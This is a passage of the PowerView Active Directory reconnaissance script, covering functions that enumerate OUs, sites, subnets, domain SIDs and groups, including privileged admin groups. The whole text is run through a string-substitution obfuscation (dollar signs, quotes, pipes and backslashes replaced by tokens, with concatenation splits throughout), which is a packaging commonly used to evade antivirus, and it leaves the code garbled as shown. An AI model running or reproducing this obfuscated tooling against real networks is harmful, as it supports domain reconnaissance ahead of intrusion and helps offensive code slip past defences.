                        Write-Verbose Zfr[Get-DomainOU] Extracted domain 41agIF1IdentityDomain41a from 41agIF1IdentityInstance41aZfr
                        gIF1SearcherArguments[41aDomain41a] = gIF1IdentityDomain
                        gIF1OUSearcher = Get-DomainSearcher @SearcherArguments
                        if (-not gIF1OUSearcher) {
                            Write-Warning Zfr[Get-DomainOU] Unable to retrieve domain searcher for 41agIF1IdentityDomain41aZfr
                        }
                    }
                }
                else {
                    try {
                        gIF1GuidByteString = (-Join (([Guid]gIF1IdentityInstance).ToByteArray() U9B ForEach-Object {gIF1_.ToString(41aX41a).PadLeft(2,41a041a)})) -Replace 41a(..)41a,41aYwWgIF1141a
   '+'                     gIF1IdentityFilter += Zfr(objectguid=gIF1GuidByteString)Zfr
                    }
                    catch {
 '+'                       gIF1IdentityFilter += Zfr(name=gIF1IdentityInstance)Zfr
                    }
                }
            }
            if (gIF1IdentityFilter -and (gIF1IdentityFilter.Trim() -ne 41a41a) ) {
                gIF1Filter += Zfr(U9BgIF1IdentityFilter)Zfr
            }

            if (gIF1PSBoundParameters[41aGPLink41a]) {
                Write-Verbose Zfr[Get-DomainOU] Searching for OUs with gIF1GPLink set in the gpLink propertyZfr
                gIF1Filter += Zfr(gplink=*gIF1GPLink*)Zfr
            }

            if (gIF1PSBoundParameters[41aLDAPFilter41a]) {
   '+'             Write-Verbose Zfr[Get-DomainOU] Using additional LDAP filter: gIF1LDAPFilterZfr
                gIF1Filter += ZfrgIF1LDAPFilterZfr
            }

            gIF1OUSearcher.filter = Zfr(&(objectCategory=organizationalUnit)gIF1Filter)Zfr
            Write-Verbose Zfr[Get-DomainOU] Get-DomainOU filter string: gIF1(gIF1OUSearcher.filter)Zfr

            if (gIF1PSBoundParameters[41aFindOne41a]) { gIF1Results = gIF1OUSearcher.FindOne() }
            else { gIF1Results = gIF1OUSearcher.FindAll() }
            gIF1Results U9B Where-Object {gIF1_} U9B ForEach-Object {
                if (gIF1PSBoundParameters[41aRaw41a])'+' {
                    # return raw result objects
                    gIF1OU = gIF1_
                }
                else {
                    gIF1OU = Convert-LDAPProperty -Properties gIF1_.Properties
                }
                gIF1OU.PSObject.TypeNames.Insert(0, 41aPowerView.OU41a)
                gIF1OU
            }
            if (gIF1Results) {
                try { gIF1Results.dispose() }
                catch {
                    Write-Verbose Zfr[Get-DomainOU] Error disposing of the Results object: gIF1_Zfr
                }
            }
            gIF1OUSearcher.dispose()
        }
    }
}


function Get-DomainSite {
<#
.SYNOPSIS

Search for all sites or specific site objects in AD.

Author: Will Schroeder (@harmj0y)  
License: BSD 3-Clause  
Required Dependencies: Get-DomainSearcher, Convert-LDAPProperty  

.DESCRIPTION

Builds a directory searcher object using Get-DomainSearcher, builds a custom
LDAP filter based on targeting/filter parameters, and searches for all objects
matching the criteria. To only return specific properties, use
Zfr-Properties whencreated,usnchanged,...Zfr. By default, all site objects for
the current domain are returned.

.PARAMETER Identity

An site name (e.g. Test-Site), DistinguishedName (e.g. CN=Test-Site,CN=Sites,CN=Configuration,DC=testlab,DC=local), or
GUID (e.g. c37726ef-2b64-4524-b85b-6a9700c234dd). Wildcards accepted.

.PARAMETER GPLink

Only return sites with the specified GUID in their gplink property.

.PARAMETER Domain

Specifies the domain to use for the query, defaults to the current domain.

.PARAMETER LDAPFilter

Specifies an LDAP query string that is used to filter Active Directory objects.

.PARAMETER Properties

Specifies the properties of the output object to retrieve from the server.

.PARAMETER SearchBase

The LDAP source to search through, e.g. ZfrLDAP://OU=secret,DC=testlab,DC=localZfr
Useful for OU queries.

.PARAMETER Server

Specifies an Active Directory server (domain controller) to bind to.

.PARAMETER SearchScope

Specifies the scope to search under, Base/OneLevel/Subtree (default of Subtree).

.PARAMETER ResultPageSize

Specifies the PageSize to set for the LDAP searcher object.

.PARAMETER ServerTimeLimit

Specifies the maximum amount of time the server spends searching. Default of 120 seconds.

.PARAMETER SecurityMasks
'+'
Specifies an option for examining security information of a directory object.
One of 41aDacl41a, 41aGroup41a, 41aNone41a, 41aOwner41a, 41aSacl41a.

.PARAMETER Tombstone

Switch. Specifies that the searcher should also return deleted/tombstoned objects.

.PARAMETER FindOne

Only return one result object.

.PARAMETER Credential

A [Management.Automation.PSCredential] object of alternate credentials
for connection to the target domain.

.PARAMETER Raw

Switch. Return raw results instead of translating the fields into a custom PSObject.

.EXAMPLE

Get-DomainSite

Returns the current sites in the domain.

.EXAMPLE

Get-DomainSite *admin* -Domain testlab.local

Returns all sites with ZfradminZfr in their name in the testlab.local domain.

.EXAMPLE

Get-DomainSite -GPLink ZfrF260B76D-55C8-46C5-BEF1-9016DD98E272Zfr

Returns all sites with linked to the specified group policy object.

.EXAMPLE

gIF1SecPassword = ConvertTo-SecureString 41aPassword123!41a -AsPlainText -Force
gIF1Cred = New-Object System.Management.Automation.PSCredential(41aTESTLABYwWdfm.a41a, gIF1SecPassword)
Get-DomainSite -Credential gIF1Cred

.OUTPUTS

PowerView.Site

Custom PSObject with translated site property fields.
#>

    [Diagnostics.CodeAnalysis.SuppressMessageAttribute(41aPSShouldProcess41a, 41a41a)]
    [OutputType(41aPowerView.Site41a)]
    [CmdletBinding()]
    Param (
        [Parameter(Position = 0, ValueFromPipeline = gIF1True, ValueFromPipelineByPropertyName = gIF1True)]
        [Alias(41aName41a)]
        [String[]]
        gIF1Identity,

        [ValidateNotNullOrEmpty()]
        [String]
        [Alias(41aGUID41a)]
        gIF1GPLink,

        [ValidateNotNullOrEmpty()]
        [String]
        gIF1Domain,

        [ValidateNotNullOrEmpty()]
        [Alias(41aFilter41a)]
        [String]
        gIF1LDAPFilter,

        [ValidateNotNullOrEmpty()]
        [String[]]
        gIF1Properties,

        [ValidateNotNullOrEmpty()]
        [Alias(41aADSPath41a)]
        [String]
        gIF1SearchBase,

        [ValidateNotNullOrEmpty()]
        [Alias(41aDomainController41a)]
        [String]
        gIF1Server,

        [ValidateSet(41aBase41a, 41aOneLevel41a, 41aSubtree41a)]
        [String]
        gIF1SearchScope = 41aSubtree41a,

        [ValidateRange(1, 10000)]
        [Int]
        gIF1ResultPageSize = 200,

        [ValidateRange(1, 10000)]
        [Int]
        gIF1ServerTimeLimit,

        [ValidateSet(41aDacl41a, 41aGroup41a, 41aNone41a, 41aOwner41a, 41aSacl41a)]
        [String]
        gIF1SecurityMasks,

        [Switch]
        gIF1Tombstone,

        [Alias(41aReturnOne41a)]
        [Switch]
        gIF1FindOne,

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        gIF1Credential = [Management.Automation.PSCredential]::Empty,

        [Switch]
        gIF1Raw
    )

    BEGIN {
        gIF1SearcherArguments = @{
            41aSearchBasePrefix41a = 41aCN=Sites,CN=Configuration41a
        }
        if (gIF1PSBoundParameters[41aDomain41a]) { gIF1SearcherArguments[41aDomain41a] = gIF1Domain }
        if (gIF1PSBoundParameters[41aProperties41a]) { gIF1SearcherArguments[41aProperties41a] = gIF1Properties }
        if (gIF1PSBoundParameters[41aSearchBase41a]) { gIF1SearcherArguments[41aSearchBase41a] = gIF1SearchBase }
        if (gIF1PSBoundParameters[41aServer41a]) { gIF1SearcherArguments[41aServer41a] = gIF1Server }
        if (gIF1PSBoundParameters[41aSearchScope41a]) { gIF1SearcherArguments[41aSearchScope41a] = gIF1SearchScope }
        if (gIF1PSBoundParameters[41aResultPageSize41a]) { gIF1SearcherArguments[41aResultPageSize41a] = gIF1ResultPageSize }
        if (gIF1PSBoundParameters[41aServerTimeLimit41a]) { gIF1SearcherArguments[41aServerTimeLimit41a] = gIF1ServerTimeLimit }
        if (gIF1PSBoundParameters[41aSecurityMasks41a]) { gIF1SearcherArguments[41aSecurityMasks41a] = gIF1SecurityMasks }
        if (gIF1PSBoundParameters[41aTombstone41a]) { gIF1SearcherArguments[41aTombstone41a] = gIF1Tombstone }
        if (gIF1PSBoundParameters[41aCredential41a]) { gIF1SearcherArguments[41aCredential41a] = gIF1Credential }
        gIF1SiteSearcher = Get-DomainSearcher @SearcherArguments
    }

    PROCESS {
        if (gIF1SiteSearcher) {
            gIF1IdentityFilter = 41a41a
            gIF1Filter = 41a'+'41a
            gIF1Identity U9B Where-Object {gIF1_} U9B ForEach-Object {
                gIF1IdentityInstance = gIF1_.Replace(41a(41a, 41aYwW2841a).Replace(41a)41a, 41aYwW2941a)
                if (gIF1IdentityInstance -match 41a^CN=.*41a) {
                    gIF1IdentityFilter += Zfr(distinguishedname=gIF1IdentityInstance)Zfr
                    if ((-not gIF1PSBoundParameters[41aDomain41a]) -and (-not gIF1PSBoundParameters[41aSearchBase41a])) {
                        # if a -Domain isn41at explicitly set, extract the object domain out of the distinguishedname
                        #   and rebuild the domain searcher
                        gIF1IdentityDomain = gIF1IdentityInstance.SubString(gIF1IdentityInstance.IndexOf(41aDC=41a)) -replace 41aDC=41a,41a41a -replace 41a,41a,41a.41a
                        Write-Verbose Zfr[Get-DomainSite] Extracted domain 41agIF1IdentityDomain41a from 41agIF1IdentityInstance41aZfr
                        gIF1SearcherArguments[41aDomain41a] = gIF1IdentityDomain
                        gIF1SiteSearcher = Get-DomainSearcher @SearcherArguments
                        if (-not gIF1SiteSearcher) {
                            Write-Warning Zfr[Get-DomainSite] Unable to retrieve domain searcher for 41agIF1'+'IdentityDomain41aZfr
                        }
                    }
                }
                else {
                    try {
                        gIF1GuidByteString = (-Join (([Guid]gIF1IdentityInstance).ToByteArray() U9B ForEach-Object {gIF1_'+'.ToString(41aX41a).PadLeft(2,41a041a)})) -Replace 41a(..)41a,41aYwWgIF1141a
                        gIF1IdentityFilter += Zfr(objectguid=gIF1GuidByteString)Zfr
                    }
                    catch {
                        gIF1IdentityFilter += Zfr(name=gIF1IdentityInstance)Zfr
                    }
                }
            }
            if (gIF1IdentityFilter -and (gIF1IdentityFilter.Trim() -ne 41a41a) ) {
                gIF1Filter += Zfr(U9BgIF1IdentityFilter)Zfr
            }

            if (gIF1PSBoundParameters[41aGPLink41a]) {
                Write-Verbose Zfr[Get-DomainSite] Searching for sites with gIF1GPLink set in the gpLink propertyZfr
                gIF1Filter += Zfr(gplink=*gIF1GPLink*)Zfr
            }

            if (gIF1PSBoundParameters[41aLDAPFilter41a]) {
                Write-Verbose Zfr[Get-DomainSite] Using additional LDAP filter: gIF1LDAPFilterZfr
                gIF1Filter += ZfrgIF1LDAPFilterZfr
            }

            gIF1SiteSearcher.filter = Zfr(&(objectCategory=site)gIF1Filter)Zfr
            Write-Verbose Zfr[Get-DomainSite] Get-DomainSite filter string: gIF1(gIF1SiteSearcher.filter)Zfr

            if (gIF1PSBoundParameters[41aFindOne41a]) { gIF1Results = gIF1SiteSearcher.FindAll() }
            else { gIF1Results = gIF1SiteSearcher.FindAll() }
            gIF1Results U9B Where-Object {gIF1_} U9B ForEach-Object {
                if (gIF1PSBoundParameters[41aRaw41a]) {
                    # return raw result objects
                    gIF1Site = gIF1_
                }
                else {
                    gIF1Site = Convert-LDAPProperty -Properties gIF1_.Properties
                }
                gIF1Site.PSObject.TypeNames.Insert(0, 41aPowerView.Site41a)
                gIF1Site
            }
            if (gIF1Results) {
                try { gIF1Results.dispose() }
                catch {
                    Write-Verbose Zfr[Get-DomainSite] Error disposing of the Results objectZfr
                }
            }
            gIF1SiteSearcher.dispose()
        }
    }
}


function Get-DomainSubnet {
<#
.SYNOPSIS

Search for all subnets or specific subnets objects in AD.

Author: Will Schroeder (@harmj0y)  
License: BSD 3-Clause  
Required Dependencies: Get-DomainSearcher, Convert-LDAPProperty  

.DESCRIPTION

Builds a directory searcher object using Get-DomainSearcher, builds a custom
LDAP filter based on targeting/filter parameters, and searches for all objects
matching the criteria. To only return specific properties, use
Zfr-Properties whencreated,usnchanged,...Zfr. By default, all subnet objects for
the current domain are returned.

.PARAMETER Identity

An subnet name (e.g. 41a192.168.50.0/2441a), DistinguishedName (e.g. 41aCN=192.168.50.0/24,CN=Subnets,CN=Sites,CN=Configuratioiguration,DC=testlab,DC=local41a),
or GUID (e.g. c37726ef-2b64-4524-b85b-6a9700c234dd). Wildcards accepted.

.PARAMETER SiteName

Only return subnets from the specified SiteName.

.PARAMETER Domain

Specifies the domain to use for the query, defaults to the current domain.

.PARAMETER LDAPFilter

Specifies an LDAP query string that is used to filter Active Directory objects.

.PARAMETER Properties

Specifies the properties of the output object to retrieve from the server.

.PARAMETER SearchBase

The LDAP source to search through, e.g. ZfrLDAP://OU=secret,DC=testlab,DC=localZfr
Useful for OU queries.

.PARAMETER Server

Specifies an Active Directory server (domain controller) to bind to.

.PARAMETER SearchScope

Specifies the scope to search under, Base/OneLevel/Subtree (default of Subtree).

.PARAMETER ResultPageSize

Specifies the PageSize to set for the LDAP searcher object.

.PARAMETER ServerTimeLimit

Specifies the maximum amount of time the server spends searching. Default of 120 seconds.

.PARAMETER SecurityMasks
'+'

Specifies an option for examining security information of a directory object.
One of 41aDacl41a, 41aGroup41a, 41aNone41a, 41aOwner41a, 41aSacl41a.

.PARAMETER Tombstone

Switch. Specifies that the searcher should also return deleted/tombstoned objects.

.PARAMETER FindOne

Only return one result object.

.PARAMETER Credential

A [Management.Automation.PSCredential] object of alternate credentials
for connection to the target domain.

.PARAMETER Raw

Switch. Return raw results instead of translating the fields into a custom PSObject.

.EXAMPLE
'+'
Get-DomainSubnet

Returns the current subnets in the domain.

.EXAMPLE

Get-DomainSubnet *admin* -Domain testlab.local

Returns all subnets with ZfradminZfr in their name in the testlab.local domain.

.EXAMPLE

Get-DomainSubnet -GPLink ZfrF260B76D-55C8-46C5-BEF1-9016DD98E272Zfr

Returns all subnets with linked to the specified group policy object.

.EXAMPLE

gIF1SecPassword = ConvertTo-SecureString 41aPassword123!41a -AsPlainText -Force
gIF1Cred = New-Object System.Management.Automation.PSCredential(41aTESTLABYwWdfm.a41a, gIF1SecPassword)
Get-DomainSubnet -Credential gIF1Cred

.OUTPUTS

PowerView.Subnet

Custom PSObject with translated subnet property fields.
#>

    [Diagnostics.CodeAnalysis.SuppressMessageAttribute(41aPSShouldProcess41a, 41a41a)]
    [OutputType(41aPowerView.Subnet41a)]
    [CmdletBinding()]
    Param (
        [Parameter(Position = 0, ValueFromPipeline = gIF1True, ValueFromPipelineByPropertyName = gIF1True)]
        [Alias(41aName41a)]
        [String[]]
        gIF1Identity,

        [ValidateNotNullOrEmpty()]
        [String]
        gIF1SiteName,

        [ValidateNotNullOrEmpty()]
        [String]
        gIF1Domain,

        [ValidateNotNullOrEmpty()]
        [Alias(41aFilter41a)]
        [String]
        gIF1LDAPFilter,

        [ValidateNotNullOrEmpty()]
        [String[]]
        gIF1Properties,

        [ValidateNotNullOrEmpty()]
        [Alias(41aADSPath41a)]
        [String]
        gIF1SearchBase,

        [ValidateNotNullOrEmpty()]
        [Alias(41aDomainController41a)]
        [String]
        gIF1Server,

        [ValidateSet(41aBase41a, 41aOneLevel41a, 41aSubtree41a)]
        [String]
        gIF1SearchScope = 41aSubtree41a,

        [ValidateRange(1, 10000)]
        [Int]
        gIF1ResultPageSize = 200,

        [ValidateRange(1, 10000)]
        [Int]
        gIF1ServerTimeLimit,

        [ValidateSet(41aDacl41a, 41aGroup41a, 41aNone41a, 41aOwner41a, 41aSacl41a)]
        [String]
        gIF1SecurityMasks,

        [Switch]
        gIF1Tombstone,

        [Alias(41aReturnOne41a)]
        [Switch]
        gIF1FindOne,

        [Management.Automation.PSCredential]
        [Management.Automation.Credentia'+'lAttribute()]
        gIF1Credential = [Management.Automation.PSCredential]::Empty,

        [Switch]
        gIF1Raw
    )

    BEGIN {
        gIF1SearcherArguments = @{
            41aSearchBasePrefix41a = 41aCN=Subnets,CN=Sites,CN=Configuration41a
        }
        if (gIF1PSBoundParameters[41aDomain41a]) { gIF1SearcherArguments[41aDomain41a] = gIF1Domain }
        if (gIF1PSBoundParameters[41aProperties41a]) { gIF1SearcherArguments[41aProperties41a] = gIF1Properties }
        if (gIF1PSBoundParameters[41aSearchBase41a]) { gIF1SearcherArguments'+'[41aSearchBase41a] = gIF1SearchBase }
        if (gIF1PSBoundParameters[41aServer41a]) { gIF1SearcherArguments[41aServer41a] = gIF1Server }
        if (gIF1PSBoundParameters[41aSearchScope41a]) { gIF1SearcherArguments[41aSearchScope41a] = gIF1SearchScope }
        if (gIF1PSBoundParameters[41aResultPageSize41a]) { gIF1SearcherArguments[41aResultPageSize41a] = gIF1ResultPageSize }
        if (gIF1PSBoundParameters[41aServerTimeLimit41a]) { gIF1SearcherArguments[41aServerTimeLimit41a] = gIF1ServerTimeLimit }
        if (gIF1PSBoundParameters[41aSecurityMasks41a]) { gIF1SearcherArguments[41aSecurityMasks41a] = gIF1SecurityMasks }
        if (gIF1PSBoundParameters[41aTombstone41a]) { gIF1SearcherArguments[41aTombstone41a] = gIF1Tombstone }
        if (gIF1PSBoundParameters[41aCredential41a]) { gIF1SearcherArguments[41aCredential41a] = gIF1Credential }
        gIF1SubnetSearcher = Get-DomainSearcher @SearcherArguments
    }

    PROCESS {
        if (gIF1SubnetSearcher) {
            gIF1IdentityFilter = 41a41a
            gIF1Filter = 41a41a
            gIF1Identity U9B Where-Object {gIF1_} U9B ForEach-Object {
                gIF1IdentityInstance = gIF1_.Replace(41a(41a, 41aYwW2841a).Replace(41a)41a, 41aYwW2941a)
                if (gIF1IdentityInstance -match 41a^CN=.*41a) {
                    gIF1IdentityFilter += Zfr(distinguishedname=gIF1IdentityInstance)Zfr
                    if ((-not gIF1PSBoundParameters[41aDomain41a]) -and (-not gIF1PSBoundParameters[41aSearchBase41a])) {
                        # if a -Domain isn41at explicitly set, extract the object domain out of the distinguishedname
                        #   and rebuild the domain searcher
                        gIF1IdentityDomain = gIF1IdentityInstance.SubString(gIF1IdentityInstance.IndexOf(41aDC=41a)) -replace 41aDC=41a,41a41a -replace 41a,41a,41a.41a
                        Write-Verbose Zfr[Get-DomainSubnet] Extracted domain 41agIF1IdentityDomain41a from 41agIF1IdentityInstance41aZfr
  '+'                      gIF1SearcherArguments[41aDomain41a] = gIF1IdentityDomain
                        gIF1SubnetSearcher = Get-DomainSearcher @SearcherArguments
                        if (-not gIF1SubnetSearcher) {
                            Write-Warning Zfr[Get-DomainSubnet] Unable to retrieve domain searcher for 41agIF1IdentityDomain41aZfr
                        }
                    }
                }
                else {
                    try {
                        gIF1GuidByteString = (-Join (([Guid]gIF1IdentityInstance).ToByteArray() U9B ForEach-Object {gIF1_.ToString(41aX41a).PadLeft(2,41a041a)})) -Replace 41a(..)41a,41aYwWgIF1141a
                        gIF1IdentityFilter += Zfr(objectguid=gIF1GuidByteString)Zfr
                    }
                    catch {
                        gIF1IdentityFilter += Zfr(name=gIF1IdentityInstance)Zfr
                    }
                }
            }
            if (gIF1IdentityFilter -and (gIF1IdentityFilter.Trim() -ne 41a41a) ) {
                gIF1Filter += Zfr(U9BgIF1IdentityFilter)Zfr
            }

            if (gIF1PSBoundParameters[41aLDAPFilter41a]) {
                Write-Verbose Zfr[Get-DomainSubnet] Using additional LDAP filter: gIF1LDAPFilterZfr
                gIF1Filter += ZfrgIF1LDAPFilterZfr
            }

            gIF1SubnetSearcher.filter = Zfr(&(objectCategory=subnet)gIF1Filter)Zfr
            Write-Verbose Zfr[Get-DomainSubnet] Get-DomainSubnet filter string: gIF1(gIF1SubnetSearcher.filter)Zfr

            if (gIF1PSBoundParameters[41aFindOne41a]) { gIF1Results = gIF1SubnetSearcher.FindOne() }
            else { gIF1Results = gIF1SubnetSearcher.FindAll() }
            gIF1Results U9B Where-Object {gIF1_} U9B ForEach-Object {
                if (gIF1PSBoundParameters[41aRaw41a]) {
                    # return raw result objects
                    gIF1Subnet = gIF1_
                }
                else {
                    gIF1Subnet = Convert-LDAPProperty -Properties gIF1_.Properties
                }
                gIF1Subnet.PSObject.TypeNames.Insert(0, 41aPowerView.Subnet41a)

                if (gIF1PSBoundParameters[41aSiteName41a]) {
                    # have to do the filtering after the LDAP query as LDAP doesn41at'+' let you specify
                    #   wildcards for 41asiteobject41a :(
                    if (gIF1Subnet.properties -and (gIF1Subnet.properties.siteobject -like Zfr*gIF1SiteName*Zfr)) {
                        gIF1Subnet
                    }
                    elseif (gIF1Subnet.siteobject -like Zfr*gIF1SiteName*Zfr) {
                        gIF1Subnet
                    }
                }
                else {
                    gIF1Subnet
                }
            }
            if (gIF1Results) {
                try { gIF1Results.dispose() }
                catch {
                    Write-Verbose Zfr[Get-DomainSubnet] Error disposing of the Results object: gIF1_Zfr
                }
            }
            gIF1SubnetSearcher.dispose()
        }
    }
}


function Get-DomainSID {
<#
.SYNOPSIS

Returns the SID for the current domain or the specified domain.

Author: Will Schroeder (@harmj0y)  
Licen'+'se: BSD 3-Clause  
Required Dependencies: Get-DomainComputer  

.DE'+'SCRIPTION

Returns the SID for the current domain or the specified domain by executing
Get-DomainComputer with the -LDAPFilter set to (userAccountControl:1.2.840.113556.1.4.803:=8192)
to search for domain controllers through LDAP. The SID of the returned domain controller
is then extracted.

.PARAMETER Domain

Specifies the domain to use for the query, defaults to the current domain.

.PARAMETER Server

Specifies an Active Directory server (domain controller) to bind to.

.PARAMETER Credential

A [Management.Automation.PSCredential] object of alternate credentials
for connection to the target domain.

.EXAMPLE

Get-DomainSID

.EXAMPLE

Get-DomainSID -Domain testlab.local

.EXAMPLE

gIF1SecPassword = ConvertTo-Secur'+'eString 41aPassword123!41a -AsPlainText -Force
gIF1Cred = New-Object System.Management.Automation.PSCredential(41aTESTLABYwWdfm.a41a, gIF1SecPassword)
Get-DomainSID -Credential gIF1Cred

.OUTPUTS

String

A string representing the specified domain SID.
#>

    [Diagnostics.CodeAnalysis.SuppressMessageAttribute(41aPSShouldProcess41a'+', 41a41a)]
    [OutputType([String])]
    [CmdletBinding()]
    Param(
        [ValidateNotNullOrEmpty()]
        [String]
        gIF1Domain,

        [ValidateNotNullOrEmpty()]
        [Alias(41aDomainController41a)]
        [String]
        gIF1Server,

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        gIF1Credential = [Management.Automation.PSCredential]::Empty
    )

    gIF1SearcherArguments = @{
        41aLDAPFilter41a = 41a(userAccountControl:1.2.840.113556.1.4.803:=8192)41a
    }
    if (gIF1PSBoundParameters[41aDomain41a]) { gIF1SearcherArguments[41aDomain41a] = gIF1Domain }
    if (gIF1PSBoundParameters[41aServer41a]) { gIF1SearcherArguments[41aServer41a] = gIF1Server }
    if (gIF1PSBoundParameters[41aCredential41a]) { gIF1SearcherArguments[41aCredential41a] = gIF1Credential }

    gIF1DCSID = Get-DomainComputer'+' @SearcherArguments -FindOne U9B Select-Object -First 1 -ExpandProperty objectsid

    if (gIF1DCSID) {
        gIF1DCSID.SubString(0, gIF1DCSID.LastIndexOf(41a-41a))
    }
    else {
        Write-Verbose Zfr[Get-DomainSID] Error extracting domain SID for 41agIF1Domain41aZfr
    }
}


function Get-DomainGroup {
<#
.SYNOPSIS

Return all groups or specific group objects in AD.

Author: Will Schroeder (@harmj0y)  
License: BSD 3-Clause  
Required Dependencies: Get-DomainSearcher, Get-DomainObject, Convert-ADName, Convert-LDAPProperty  

.DESCRIPTION

Builds a directory searcher object using Get-DomainSearcher, builds a custom
LDAP filter based on targeting/filter parameters, and searches for all objects
matching the criteria. To only return specific properties, use
Zfr-Properties samaccountname,usnchanged,...Zfr. By default, all group objects for
the current domain are returned. To return the groups a specific user/group is
a part of, use -MemberIdentity X to execute token groups enumeration.

.PARAMETER Identity

A SamAccountName (e.g. Group1), DistinguishedName (e.g. CN=group1,CN=Users,DC=testlab,DC=local),
SID (e.g. S-1-5-21-890171859-3433809279-3366196753-1114), or GUID (e.g. 4c435dd7-dc58-4b14-9a5e-1fdb0e80d202)
specifying the group to query for. Wildcards accepted.

.PARAMETER MemberIdentity

A SamAccountName (e.g. Group1), DistinguishedName (e.g. CN=group1,CN=Users,DC=testlab,DC=local),
SID (e.g. S-1-5-21-890171859-3433809279-3366196753-1114), or GUID (e.g. 4c435dd7-dc58-4b14-9a5e-1fdb0e80d202)
specifying the user/group member to query for group membership.

.PARAMETER AdminCount

Switch. Return users with 41a(adminCount=1)41a (meaning are/were privileged).

.PARAMETER GroupScope

Specifies the scope (DomainLocal, Global, or Universal) of the group(s) to search for.
Also accepts NotDomainLocal, NotGloba, and NotUniversal as negations.

.PARAMETER GroupProperty

Specifies a specific property to search for when performing the group search.
Possible values are Security, Distribution, CreatedBySystem, and NotCreatedBySystem.

.PARAMETER Domain

Specifies the domain to use for the query, defaults to the current domain.

.PARAMETER LDAPFilter

Specifies an LDAP query string that is used to filter Active Directory objects.

.PARAMETER Properties

Specifies the properties of the output object to retrieve from the server.

.PARAMETER SearchBase

The LDAP source to search through, e.g. ZfrLDAP://OU=secret,DC=testlab,DC=localZfr
Useful for OU queries.

.PARAMETER Server

Specifies an Active Directory server (domain controller) to bind to.

.PARAMETER SearchScope

Specifies the scope to search under, Base/OneLevel/Subtree (default of Subtree).

.PARAMETER ResultPageSize

Specifies the PageSize to set for the LDAP searcher object.

.PARAMETER ServerTimeLimit

Specifies the maximum amount of time the server spends searching. Default of 120 seconds.

.PARAMETER SecurityMasks

Specifies an option for examining security information of a directory object.
One of 41aDacl41a, 41aGroup41a, 41aNone41a, 41aOwner41a, 41aSacl41a.

.PARAMETER Tombstone

Switch. Specifies that the searcher should also return deleted/tombstoned objects.

.PARAMETER FindOne

Only return one result object.

.PARAMETER Credential

A [Management.Automation.PSCredential] object of alternate credentials
for connection to the target domain.

.PARAMETER Raw

Switch. Return raw results instead of translating the fields into a custom PSObject.

.EXAMPLE

Get-DomainGroup U9B select samaccountname

samaccountname
--------------
WinRMRemoteWMIUsers__
Administrators
Users
Guests
Print Operators
Backup Operators
...

.EXAMPLE

Get-DomainGroup *admin* U9B select distinguishedname

distinguishedname
-----------------
CN=Administrators,CN=Builtin,DC=testlab,DC=local
CN=Hyper-V Administrators,CN=Builtin,DC=testlab,DC=local
CN=Schema Admins,CN=Users,DC=testlab,DC=local
CN=Enterprise Admins,CN=Users,DC=testlab,DC=local
CN=Domain Admins,CN=Users,DC=testlab,DC=local
CN=DnsAdmins,CN=Users,DC=testlab,DC=local
CN=Server Admins,CN=Users,DC=testlab,DC=local
CN=Desktop Admins,CN=Users,DC=testlab,DC=local

.EXAMPLE

Get-DomainGroup -Properties samaccountname -Identity 41aS-1-5-21-890171859-3433809279-3366196753-111741a U9B fl

samaccountname
--------------
Server Admins

.EXAMPLE

41aCN=Desktop Admins,CN=Users,DC=testlab,DC=local41a U9B Get-DomainGroup -Server primary.testlab.local -Verbose
VERBOSE: Get-DomainSearcher search string: LDAP://DC=testlab,DC=local
VERBOSE: Get-DomainGroup filter string: (&(objectCategory=group)(U9B(distinguishedname=CN=DesktopAdmins,CN=Users,DC=testlab,DC=local)))

usncreated            : 13245
grouptype             : -2147483646
samaccounttype        : 268435456
samaccountname        : Desktop Admins
whenchanged           : 8/10/2016 12:30:30 AM
objectsid             : S-1-5-21-890171859-3433809279-3366196753-1118
objectclass           : {top, group}
cn                    : Desktop Admins
usnchanged            : 13255
dscorepropagationdata : 1/1/1601 12:00:00 AM
name                  : Desktop Admins
distinguishedname     : CN=Desktop Admins,CN=Users,DC=testlab,DC=local
member                : CN=Andy Robbins (admin),CN=Users,DC=testlab,DC=local
whencreated           : 8/10/2016 12:29:43 AM
instancetype          : 4
objectguid            : f37903ed-b333-49f4-abaa-46c65e9cca71
objectcategory        : CN=Group,CN=Schema,CN=Configuration,DC=testlab,DC=local

.EXAMPLE

gIF1SecPassword = ConvertTo-SecureString 41aPassword123!41a -AsPlainText -Force
gIF1Cred = New-Object System.Management.Automation.PSCredential(41aTESTLABYwWdfm.a41a, gIF1SecPassword)
Get-DomainGroup -Credential gIF1Cred

.EXAMPLE

Get-Domain U9B Select-Object -Expand name
testlab.local

41aDEVYwWDomain Admins41a U9B Get-DomainGroup -Verbose -Properties distinguishedname
VERBOSE: [Get-DomainSearcher] search string: LDAP://PRIMARY.testlab.local/DC=testlab,DC=local
VERBOSE: [Get-DomainGroup] Extracted domain 41adev.testlab.local41a from 41aDEVYwWDomain Admins41a
VERBOSE: [Get-DomainSearcher] search string: LDAP://PRIMARY.testlab.local/DC=dev,DC=testlab,DC=local
VERBOSE: [Get-DomainGroup] filter string: (&(objectCategory=group)(U9B(samAccountName=Domain Admins)))

distinguishedname
-----------------
CN=Domain Admins,CN=Users,DC=dev,DC=testlab,DC=local

.OUTPUTS

PowerView.Group

Custom PSObject with translated group property fields.
#>

    [Diagnostics.CodeAnalysis.SuppressMessageAttribute(41aPSShouldProcess41a, 41a41a)]
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute(41aPSUseDeclaredVarsMoreThanAssignments41a, 41a41a)]
    [OutputType(41aPowerView.Group41a)]
    [CmdletBinding(DefaultParameterSetName = 41aAllowDelegation41a)]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = gIF1True, ValueFromPipelineByPropertyName = gIF1True)]
        [Alias(41aDistinguishedName41a, 41aSamAccountName41a, 41aName41a, 41aMemberDistinguishedName41a, 41aMemberName41a)]
        [String[]]
        gIF1Identity,

        [ValidateNotNullOrEmpty()]
        [Alias(41aUserName41a)]
        [String]
        gIF1MemberIdentity,

        [Switch]
        gIF1AdminCount,

        [ValidateSet(41aDomainLocal41a, 41aNotDomainLocal41a, 41aGlobal41a, 41aNotGlobal41a, 41aUniversal41a, 41aNotUniversal41a)]
        [Alias(41aScope41a)]
        [String]
        gIF1GroupScope,

        [ValidateSet(41aSecurity41a, 41aDistribution41a, 41aCreatedBySystem41a, 41aNotCreatedBySystem41a)]
     '+'   [String]
        gIF1GroupProperty,

        [ValidateNotNullOrEmpty()]
        [String]
        gIF1Domain,

        [ValidateNotNullOrEmpty()]
        [Alias(41aFilter41a)]
        [String]
        gIF1LDAPFilter,

